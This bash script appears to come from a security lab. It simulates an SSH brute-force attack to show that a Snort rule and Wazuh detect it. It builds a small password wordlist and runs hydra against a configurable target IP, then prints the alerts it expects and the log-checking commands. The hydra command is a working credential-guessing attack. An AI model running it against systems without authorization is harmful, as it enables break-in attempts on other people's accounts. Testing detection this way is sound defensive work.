#!/bin/bash
###############################################################################
# SSH Brute Force Attack Simulation
# Author: Inkwang Lee
# Purpose: Demonstrate Snort detection of SSH brute force (Rule 1000002)
# CAUTION: For educational purposes only. Use only on authorized systems.
###############################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

TARGET_IP=${1:-172.0.0.2}
TARGET_PORT=${2:-22}

echo -e "${RED}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║    SSH Brute Force Attack Simulation                  ║${NC}"
echo -e "${RED}║    EDUCATIONAL PURPOSE ONLY - AUTHORIZED USE ONLY     ║${NC}"
echo -e "${RED}╚════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}⚠️  WARNING:${NC} This script generates malicious traffic"
echo -e "${YELLOW}Only use against systems you own or have permission to test${NC}"
echo ""
read -p "Press Enter to continue or Ctrl+C to abort..."
echo ""

# Check if hydra is installed
if ! command -v hydra &> /dev/null; then
    echo -e "${RED}❌ Hydra not found${NC}"
    echo "Install with: sudo apt install hydra"
    exit 1
fi

# Create small wordlist
echo -e "${GREEN}📝 Creating test wordlist...${NC}"
cat > /tmp/test-passwords.txt << 'WORDLIST'
admin
password
123456
student
root
test
demo
WORDLIST

echo -e "${GREEN}✅ Wordlist created: /tmp/test-passwords.txt${NC}"
echo ""

# Display attack parameters
echo -e "${YELLOW}Attack Parameters:${NC}"
echo "  Target:     $TARGET_IP:$TARGET_PORT"
echo "  Username:   student"
echo "  Passwords:  7 attempts"
echo "  Tool:       Hydra"
echo ""

# Execute attack
echo -e "${GREEN}🚀 Launching SSH brute force attack...${NC}"
echo ""

hydra -l student -P /tmp/test-passwords.txt ssh://$TARGET_IP:$TARGET_PORT -t 4 -V

echo ""
echo -e "${GREEN}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              Attack Simulation Complete               ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}Expected Snort Detection:${NC}"
echo "  Rule:     1000002 (SSH Brute Force)"
echo "  Trigger:  5+ failed attempts within 60 seconds"
echo "  Severity: HIGH"
echo "  MITRE:    T1110.003 (Password Spraying)"
echo ""
echo -e "${YELLOW}Verify Detection:${NC}"
echo "  1. Check Snort alerts: cat /var/log/snort/alert"
echo "  2. Check auth.log: sudo grep 'Failed password' /var/log/auth.log"
echo "  3. Check Wazuh dashboard for correlated events"
echo ""

# Cleanup
rm /tmp/test-passwords.txt
